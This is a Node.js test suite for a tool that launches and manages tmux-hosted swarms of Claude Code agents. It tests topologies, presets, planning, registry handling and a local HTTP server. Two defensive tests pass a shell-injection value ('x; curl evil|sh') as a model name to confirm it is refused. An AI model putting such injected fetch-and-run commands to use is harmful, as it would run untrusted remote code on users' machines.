'use strict';

// Conductor V2 tests — real modules, real files, real HTTP; tmux integration runs only when
// tmux is installed. Run: npm test
//
// HOME is pointed at a throwaway dir BEFORE any module loads, so the swarm/registry paths
// (~/.conductor2/…) land in the sandbox, never in the real home.

const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const { spawnSync } = require('child_process');

const SANDBOX = fs.mkdtempSync(path.join(os.tmpdir(), 'conductor2-test-'));
process.env.HOME = SANDBOX;
process.env.USERPROFILE = SANDBOX; // windows safety

const topologies = require('./topologies');
const presets = require('./presets');
const swarm = require('./swarm');
const manage = require('./manage');

let pass = 0, fail = 0;
function ok(cond, msg) {
  if (cond) { pass++; console.log('  ✓ ' + msg); }
  else { fail++; console.error('  ✗ ' + msg); }
}

// --- topologies ------------------------------------------------------------------------------
console.log('\ntopologies');
{
  const h = topologies.get('hierarchical');
  const roles = h.roles(5, ['alpha', 'beta']);
  ok(roles.length === 5 && roles[0].slot === 'orc' && roles[0].initiator, 'hierarchical: orc + 4 workers, orc initiates');
  ok(roles[1].role === 'alpha' && roles[2].role === 'beta' && roles[3].role === 'worker 3', 'hierarchical: role hints applied, then defaults');

  const ctx = (key, n) => {
    const t = topologies.get(key);
    const agents = t.roles(n).map((r) => ({ ...r, window: `sw-${r.slot}` }));
    return { t, ctx: { swarm: 'sw', topology: key, purpose: 'PURPOSE-X', dir: '/tmp/sw', sayPath: '/tmp/say', agents } };
  };

  const hc = ctx('hierarchical', 3);
  const orcBrief = hc.t.briefing(hc.ctx, hc.ctx.agents[0]);
  const wBrief = hc.t.briefing(hc.ctx, hc.ctx.agents[1]);
  ok(orcBrief.includes('ORCHESTRATOR') && orcBrief.includes('REPORT.md') && orcBrief.includes('PURPOSE-X'), 'orc briefing: role, mission, final report');
  ok(wBrief.includes('WAIT') && wBrief.includes('sw-orc'), 'worker briefing: waits for the orchestrator');

  const pc = ctx('pipeline', 3);
  const s1 = pc.t.briefing(pc.ctx, pc.ctx.agents[0]);
  const s3 = pc.t.briefing(pc.ctx, pc.ctx.agents[2]);
  ok(s1.includes('begin IMMEDIATELY') && s1.includes('sw-s2'), 'pipeline: stage 1 starts and hands off to stage 2');
  ok(s3.includes('FINAL stage') && s3.includes('REPORT.md'), 'pipeline: last stage owns REPORT.md');
  ok(pc.t.roles(3)[0].initiator && !pc.t.roles(3)[1].initiator, 'pipeline: only stage 1 initiates');

  const mc = ctx('mesh', 4);
  const p1 = mc.t.briefing(mc.ctx, mc.ctx.agents[0]);
  const p2 = mc.t.briefing(mc.ctx, mc.ctx.agents[1]);
  ok(p1.includes('SCRIBE') && !p2.includes('SCRIBE'), 'mesh: only peer 1 is scribe');
  ok(p2.includes('claims.md') && p2.includes('sw-p1') && p2.includes('sw-p3'), 'mesh: peers claim angles and know each other');

  let threw = false;
  try { topologies.get('star'); } catch { threw = true; }
  ok(threw, 'unknown topology throws');
}

// --- presets ---------------------------------------------------------------------------------
console.log('\npresets');
{
  ok(presets.list().length === 3, 'three premade setups');
  for (const p of presets.list()) {
    ok(!!(p.title && p.desc && p.purpose && p.topology && p.agents >= 2 && p.roleHints.length), `preset ${p.key}: complete`);
    topologies.get(p.topology); // throws if a preset points at a bad topology
  }
  ok(presets.get('web3-security').topology === 'pipeline', 'web3-security rides the pipeline');
  ok(/READ-ONLY/.test(presets.get('market-bots').purpose), 'market-bots is observe-and-report, not touch-the-bots');
}

// --- swarm.plan ------------------------------------------------------------------------------
console.log('\nswarm.plan');
{
  const p = swarm.plan({ preset: 'deep-research', purpose: 'research X thoroughly' });
  ok(p.topology === 'hierarchical' && p.agents.length === 5, 'preset resolves topology + crew size');
  ok(p.model === 'claude-fable-5', 'model locked to claude-fable-5');
  ok(p.agents.every((a) => a.claudeArgs.join(' ').includes('--model claude-fable-5')), 'every agent launches with --model claude-fable-5');
  ok(p.agents.every((a) => a.claudeArgs.join(' ').includes('--permission-mode acceptEdits')), 'default permission mode is acceptEdits');
  ok(p.launchOrder[p.launchOrder.length - 1] === 'deep-research-orc', 'initiator (orc) launches LAST, after its workers exist');
  ok(p.warnings.length === 0, 'explicit purpose → no placeholder warning');

  const tpl = swarm.plan({ preset: 'deep-research' });
  ok(tpl.warnings.length === 1 && /placeholder/.test(tpl.warnings[0]), 'template purpose → placeholder warning');

  const mesh = swarm.plan({ name: 'My Swarm!!', topology: 'mesh', purpose: 'explore', agents: 3, permissionMode: 'default' });
  ok(mesh.swarm === 'my-swarm', 'swarm name sanitized');
  ok(!mesh.agents[0].claudeArgs.includes('--permission-mode'), 'permissionMode default → no flag');
  ok(mesh.launchOrder.length === 3, 'mesh: everyone launches (all initiators)');
  ok(mesh.agents.every((a) => a.kickoff.length < 250 && !a.kickoff.includes('\n')), 'kickoff is a short single line (tmux-safe)');

  let threw = false;
  try { swarm.plan({ name: 'x', topology: 'mesh' }); } catch (e) { threw = /purpose/.test(e.message); }
  ok(threw, 'no purpose → refuses to plan');
  threw = false;
  try { swarm.plan({ name: 'x', purpose: 'y', permissionMode: 'yolo' }); } catch { threw = true; }
  ok(threw, 'bad permission mode → refuses');

  // M1: model lands in `claude --model <x>` typed into a shell — metachars must be refused, not fired.
  threw = false;
  try { swarm.plan({ name: 'x', purpose: 'y', topology: 'mesh', model: 'x; curl evil|sh' }); } catch (e) { threw = /model/.test(e.message); }
  ok(threw, 'M1: shell-injection model refused at plan time');

  // M2: a nonexistent cwd used to fail mid-loop in manage.run, stranding a partial swarm.
  threw = false;
  try { swarm.plan({ name: 'x', purpose: 'y', topology: 'mesh', cwd: path.join(SANDBOX, 'no-such-dir') }); } catch (e) { threw = /does not exist/.test(e.message); }
  ok(threw, 'M2: nonexistent cwd refused before anything launches');
}

// --- swarm files on disk ---------------------------------------------------------------------
console.log('\nswarm files');
{
  const p = swarm.plan({ preset: 'web3-security', purpose: 'review ~/x for leaks', name: 'sec-test' });
  swarm.writeSwarmFiles(p);
  ok(p.dir.startsWith(SANDBOX), 'swarm dir lives under the (sandboxed) home');
  ok(fs.existsSync(path.join(p.dir, 'mission.md')), 'mission.md written');
  ok(fs.readFileSync(path.join(p.dir, 'mission.md'), 'utf8').includes('review ~/x for leaks'), 'mission carries the purpose');
  ok(p.agents.every((a) => fs.existsSync(a.briefingPath)), 'every agent has a briefing file');
  const stat = fs.statSync(p.sayPath);
  ok(!!(stat.mode & 0o100), 'swarm-say helper is executable');
  ok(p.sayPath.startsWith(p.dir), 'swarm-say is per-swarm (lives in the swarm dir), not a shared global');
  const sayBody = fs.readFileSync(p.sayPath, 'utf8');
  // dogfood finding #4: the allowlist must be baked in — every member is a case arm, outsiders rejected.
  ok(p.members.every((w) => sayBody.includes(`    ${w}) ;;`)), 'swarm-say bakes in every member window as an allowed target');
  ok(/is not a member of swarm .* refusing/.test(sayBody), 'swarm-say refuses any window outside the swarm');
  ok(!sayBody.includes('dogfood-s1') && !sayBody.includes('other-swarm'), 'swarm-say has no cross-swarm targets');
  // finding #5: delivery routes through the node helper (readiness-gated), not raw send-keys.
  ok(/exec node .*swarm-say\.js/.test(sayBody), 'swarm-say execs the readiness-gated node helper');
  ok(fs.existsSync(path.join(__dirname, 'swarm-say.js')), 'the swarm-say.js helper exists in the package');
}

// --- model override (dogfood finding #10: no --model escape hatch) ---------------------------
console.log('\nmodel override');
{
  const def = swarm.plan({ name: 'm', purpose: 'x', topology: 'mesh', agents: 2 });
  ok(def.model === 'claude-fable-5', 'defaults to claude-fable-5');
  const over = swarm.plan({ name: 'm', purpose: 'x', topology: 'mesh', agents: 2, model: 'claude-opus-4-8' });
  ok(over.model === 'claude-opus-4-8' && over.agents[0].claudeArgs.join(' ').includes('--model claude-opus-4-8'), 'config.model overrides the locked default and reaches claudeArgs');
  // The swarm dir (briefings, notes/, out/) lives outside the agents' cwd; without --add-dir,
  // acceptEdits doesn't cover it and every pipeline stage stalls on a file-write prompt.
  ok(def.agents[0].claudeArgs.join(' ').includes(`--add-dir ${def.dir}`), 'claudeArgs grant --add-dir on the swarm dir so handoff writes are auto-accepted');
}

// --- regression: the bugs the dogfood swarm found (unit-level, no tmux) ----------------------
console.log('\nregressions (dogfood findings)');
{
  // BUG-1: N windows sharing one cwd must resolve to N DISTINCT sessionIds, not collapse onto the
  // newest transcript. Build a fake registry + transcripts and drive listManaged().
  const cwd = path.join(SANDBOX, 'work'); fs.mkdirSync(cwd, { recursive: true });
  const projDir = path.join(SANDBOX, '.claude', 'projects', cwd.replace(/[^A-Za-z0-9]/g, '-'));
  fs.mkdirSync(projDir, { recursive: true });
  const base = Date.now() - 5000;
  // three transcripts, staggered mtimes, all newer than the windows' launch
  [['aaa', 0], ['bbb', 1000], ['ccc', 2000]].forEach(([id, dt]) => {
    const f = path.join(projDir, id + '.jsonl');
    fs.writeFileSync(f, '{}\n');
    fs.utimesSync(f, new Date(base + dt) / 1000, new Date(base + dt) / 1000);
  });
  // three managed windows in that cwd, no sessionId yet, launch order aaa<bbb<ccc
  const reg = { windows: {} };
  ['w-s1', 'w-s2', 'w-s3'].forEach((label, i) => {
    reg.windows[label] = { label, target: 'conductor2:' + label, cwd, created: base - 200 + i * 10, sessionId: null, swarm: 'w' };
  });
  // Drive resolveSession exactly as listManaged does: resolve windows in launch order, adding each
  // bound id to the claimed set. The fix must hand back three DISTINCT sessionIds.
  const order = ['w-s1', 'w-s2', 'w-s3'];
  const claimed = new Set();
  const bound = order.map((label) => { const id = manage.resolveSession(reg.windows[label], claimed); if (id) claimed.add(id); return id; });
  ok(bound.every(Boolean) && new Set(bound).size === 3, 'BUG-1: three same-cwd windows resolve to three DISTINCT sessionIds (was: all one)');
  // Without the claimed set (old behavior emulation), they would all grab the same transcript.
  const naive = order.map((label) => manage.resolveSession(reg.windows[label], new Set()));
  ok(new Set(naive).size === 1, 'BUG-1 control: with no claim-tracking all three collapse to one — the bug the fix prevents');

  // BUG-2: pane chrome is matched in the bottom rows only — transcript content mentioning
  // "trust this folder" higher up must NOT be read as the trust prompt.
  const transcriptDiscussingTrust = 'the code checks "trust this folder" in manage.js\n'
    + Array(30).fill('  reading source, taking notes, working the mission...').join('\n')
    + '\n⏺ wrote out/stage-1.md\n❯ \n  ⏵⏵ accept edits on (shift+tab to cycle)';
  ok(!/trust this folder/i.test(manage.tailLines(transcriptDiscussingTrust)), 'BUG-2: trust phrase up in scrollback is excluded by tailLines');
  const actualTrustPrompt = 'some output\n'.repeat(30) + 'Do you trust this folder?\n❯ 1. Yes, I trust';
  ok(/trust this folder/i.test(manage.tailLines(actualTrustPrompt)), 'BUG-2: a real trust prompt at the bottom is still caught');

  // BUG-3: a turn in progress ("esc to interrupt") is 'running', NOT 'ready', so paneStage and
  // confirmDelivery no longer disagree. classifyPane is the pure core paneStage runs on the tail.
  const C = manage.classifyPane;
  ok(C('❯ \n  ⏵⏵ accept edits on (shift+tab to cycle) · esc to interrupt') === 'running', "BUG-3: empty caret + 'esc to interrupt' = running, not ready");
  ok(C('❯ \n  ⏵⏵ accept edits on (shift+tab to cycle)') === 'ready', 'idle prompt (no interrupt marker) = ready');
  ok(C('Do you trust this folder?\n❯ 1. Yes, I trust') === 'trust', 'trust prompt classified');
  ok(C('Resume from summary\nResume full session as-is') === 'resume', 'resume picker classified');
  ok(C('? for shortcuts') === 'ready' && C('loading a huge transcript…') === 'busy', 'ready footer vs unknown=busy');

  // H1: a turn-time permission menu must classify as 'menu' — it used to fall through to busy (or
  // match ready), so a board reply was typed INTO the menu as a selection. Fixture = a real
  // Claude Code permission menu.
  const MENU_PANE = '⏺ Bash(rm -rf node_modules)\n\nDo you want to run this command?\n  rm -rf node_modules\n\n'
    + "❯ 1. Yes\n  2. Yes, and don't ask again for rm commands in this project\n  3. No, and tell Claude what to do differently (esc)";
  ok(C(MENU_PANE) === 'menu', 'H1: a captured permission menu classifies as menu');
  ok(C('Do you want to proceed?\n❯ 1. Yes\n  2. No') === 'menu', 'H1: generic proceed menu classifies as menu');
  ok(C('Do you trust this folder?\n❯ 1. Yes, I trust') === 'trust', 'H1: trust prompt still wins over the menu pattern (both render "❯ 1. Yes")');

  // F1 (finishline swarm): Claude transforms EVERY non-alphanumeric cwd char to '-', not just '/'.
  // A cwd with '.', '_', or a space must still resolve — the old '/'-only transform computed a
  // directory that doesn't exist and silently lost the swarm from the cockpit.
  const oddCwd = path.join(SANDBOX, 'repo.v2_x y');
  fs.mkdirSync(oddCwd, { recursive: true });
  const oddProj = path.join(SANDBOX, '.claude', 'projects', oddCwd.replace(/[^A-Za-z0-9]/g, '-'));
  fs.mkdirSync(oddProj, { recursive: true });
  const oddF = path.join(oddProj, 'odd1.jsonl');
  fs.writeFileSync(oddF, '{}\n');
  const oddReg = { label: 'odd-s1', target: 'conductor2:odd-s1', cwd: oddCwd, created: Date.now() - 5000, sessionId: null, swarm: 'odd' };
  ok(manage.resolveSession(oddReg, new Set()) === 'odd1', "F1: cwd with '.', '_', and space still resolves its transcript (was: silently lost)");
}

// --- fire + registry (integration, needs tmux) -------------------------------------------------
console.log('\nfire (tmux integration)');
if (!manage.hasTmux()) {
  console.log('  - tmux not installed — skipped');
} else {
  const name = 'v2t' + String(process.pid).slice(-4);
  const r = swarm.fire(
    { name, topology: 'pipeline', purpose: 'integration test — do nothing', agents: 2, permissionMode: 'default' },
    { cmd: 'sleep 30 #', kickoff: false },   // never launches claude; window just sleeps
  );
  ok(r.ok, 'fire launches every window: ' + (r.error || 'ok'));
  const listed = swarm.listSwarms().find((s) => s.swarm === name);
  ok(!!listed && listed.windows.length === 2, 'fired swarm appears in listSwarms with both windows');
  ok(!!listed && listed.topology === 'pipeline', 'registry keeps the topology');
  const dbl = swarm.fire({ name, topology: 'pipeline', purpose: 'x', agents: 2 }, { cmd: 'sleep 1 #', kickoff: false });
  ok(!dbl.ok && /already/.test(dbl.error), 'double-fire into a live swarm refused');
  // H2: the kickoff is persisted in the registry at fire time, so a lost one can be re-delivered.
  const member = manage.listManaged().find((w) => w.swarm === name);
  ok(!!member && typeof member.kickoff === 'string' && member.kickoff.includes(member.label), 'H2: fire persists each window\'s kickoff in the registry');
  const stop = swarm.stopSwarm(name);
  ok(stop.ok && stop.stopped.length === 2, 'stopSwarm kills both windows');
  ok(!swarm.listSwarms().find((s) => s.swarm === name), 'stopped swarm leaves the registry');

  // D3: `claude` (or the test seam's cmd) must resolve on PATH before any window is created.
  const noBin = swarm.fire({ name: 'v2nobin', topology: 'pipeline', purpose: 'x', agents: 2 }, { cmd: 'no-such-cli-9f2c #', kickoff: false });
  ok(!noBin.ok && /PATH/.test(noBin.error), 'D3: fire refuses when the launch binary is not on PATH');
  ok(!swarm.listSwarms().find((s) => s.swarm === 'v2nobin'), 'D3: preflight failure creates no windows');

  // H1: a pane showing a permission menu refuses text delivery — typed text would be eaten as a
  // menu selection. Print a real menu into a live pane and try to deliver into it.
  const menuLabel = 'v2menu' + String(process.pid).slice(-4);
  const menuCmd = "printf 'Do you want to run this command?\\n❯ 1. Yes\\n  2. Yes, and dont ask again\\n  3. No (esc)\\n'; sleep 30 #";
  const mr = manage.run(menuLabel, [], SANDBOX, { cmd: menuCmd, capture: false });
  ok(mr.ok, 'menu fixture window launched');
  spawnSync('sleep', ['1.2']);   // let the shell render the menu
  ok(manage.paneStage(menuLabel) === 'menu', 'H1: live pane showing a permission menu stages as menu');
  const md = manage.deliver(menuLabel, 'hello there');
  ok(!md.ok && md.status === 'skipped' && md.stage === 'menu', 'H1: deliver refuses text at a permission menu');
  ok(/permission menu/.test(md.error || ''), 'H1: the refusal says approve/deny it, don\'t type into it');
  manage.stop(menuLabel);
  // approveMenu's no-menu guard: a plain shell pane is not a menu, so nothing is approved.
  const plainLabel = 'v2plain' + String(process.pid).slice(-4);
  manage.run(plainLabel, [], SANDBOX, { cmd: 'sleep 30 #', capture: false });
  spawnSync('sleep', ['0.8']);
  const am = manage.approveMenu(plainLabel);
  ok(!am.ok && /no permission menu/.test(am.error), 'H1: approveMenu refuses when no menu is showing (stale click guard)');
  manage.stop(plainLabel);
}

// --- server ----------------------------------------------------------------------------------
console.log('\nserver');
const { handle } = require('./server');
const srv = http.createServer(handle);
srv.listen(0, '127.0.0.1', async () => {
  const port = srv.address().port;
  const base = `http://127.0.0.1:${port}`;
  const get = (p) => fetch(base + p).then(async (r) => ({ status: r.status, text: await r.text() }));
  const post = (p, body, hdr = {}) => fetch(base + p, { method: 'POST', headers: { 'content-type': 'application/json', ...hdr }, body: JSON.stringify(body) }).then(async (r) => ({ status: r.status, json: JSON.parse(await r.text()) }));

  const pad = await get('/');
  ok(pad.status === 200 && pad.text.includes('Launch Pad') && pad.text.includes('FIRE UP SWARM'), 'GET / serves the launch pad');
  ok(pad.text.includes('deep-research') && pad.text.includes('hierarchical'), 'launch pad embeds presets + topologies');
  ok(pad.text.includes('claude-fable-5'), 'launch pad shows the locked Fable 5 model');

  const board = await get('/board');
  ok(board.status === 200 && board.text.includes('Board') && board.text.includes('Launch pad'), 'GET /board serves the cockpit board');
  ok(board.text.includes('isStalled') && board.text.includes('⚠ stalled?') && board.text.includes('data-nudge'), 'board ships the stalled-handoff detector + nudge (finding #5)');
  ok(board.text.includes('data-approve') && board.text.includes('data-deny') && board.text.includes('permission menu'), 'H1: board ships approve/deny buttons for permission menus');
  ok(board.text.includes('data-rekick') && board.text.includes('/api/rekick'), 'H2: board ships the kickoff-lost re-kickoff button');

  const cfg = await get('/api/config');
  const cj = JSON.parse(cfg.text);
  ok(cj.presets.length === 3 && cj.topologies.length === 3 && cj.model === 'claude-fable-5', '/api/config: 3 presets, 3 topologies, fable 5');

  const noHdr = await post('/api/plan', { preset: 'deep-research' });
  ok(noHdr.status === 403, 'POST without X-Conductor header → 403 (CSRF guard)');

  const plan = await post('/api/plan', { preset: 'deep-research', purpose: 'study Y' }, { 'x-conductor': '1' });
  ok(plan.status === 200 && plan.json.ok && plan.json.plan.agents.length === 5, '/api/plan previews the crew');

  const badStop = await post('/api/stop-swarm', { swarm: 'zzz' }, { 'x-conductor': '1' });
  ok(badStop.status === 400 && /confirm/.test(badStop.json.error), 'stop-swarm without confirm token refused');

  // M1: the injection is refused at the HTTP fire path too, before anything launches.
  const inj = await post('/api/fire', { name: 'inj', topology: 'mesh', purpose: 'x', agents: 2, model: 'x; curl evil|sh' }, { 'x-conductor': '1' });
  ok(inj.status === 400 && /model/.test(inj.json.error), 'M1: POST /api/fire with a shell-injection model → 400');

  // H2: a registry swarm member with NO transcript (sessionId never resolved) must surface as a
  // synthetic "kickoff lost?" card once past the 90s grace period — it writes no transcript, so
  // without this it has no card at all and the stalled detector is blind to it.
  if (manage.hasTmux()) {
    const lname = 'v2lost' + String(process.pid).slice(-4);
    const fr = swarm.fire({ name: lname, topology: 'pipeline', purpose: 'x', agents: 2 }, { cmd: 'sleep 30 #', kickoff: false });
    ok(fr.ok, 'lost-kickoff fixture swarm fired');
    // Age the windows past the grace period (sandboxed registry — ours to edit).
    const reg = JSON.parse(fs.readFileSync(manage.REG_FILE, 'utf8'));
    for (const k of Object.keys(reg.windows)) if (reg.windows[k].swarm === lname) reg.windows[k].created -= 120000;
    fs.writeFileSync(manage.REG_FILE, JSON.stringify(reg));
    const sess = await get('/api/sessions?minutes=60');
    const lost = (JSON.parse(sess.text).sessions || []).filter((s) => s.lost && s.swarm === lname);
    ok(lost.length === 2, 'H2: no-transcript swarm members render synthetic kickoff-lost cards');
    ok(lost.every((s) => s.managed && /kickoff may be lost/.test(s.lastAction)), 'H2: synthetic card is managed + says why');
    const w0 = fr.agents[0].window;
    const rkNo = await post('/api/rekick', { label: w0 });
    ok(rkNo.status === 403, 'H2: POST /api/rekick without X-Conductor header → 403 (CSRF guard)');
    const rkBad = await post('/api/rekick', { label: 'zzz' }, { 'x-conductor': '1' });
    ok(rkBad.status === 400 && /no live managed window/.test(rkBad.json.error), '/api/rekick refuses an unknown window');
    const rk = await post('/api/rekick', { label: w0 }, { 'x-conductor': '1' });
    ok(rk.status === 200 && rk.json.ok && rk.json.label === w0, '/api/rekick re-delivers the persisted kickoff');
    swarm.stopSwarm(lname);
  }

  srv.close();
  console.log(`\n${pass} passed, ${fail} failed\n`);
  fs.rmSync(SANDBOX, { recursive: true, force: true });
  process.exit(fail ? 1 : 0);
});
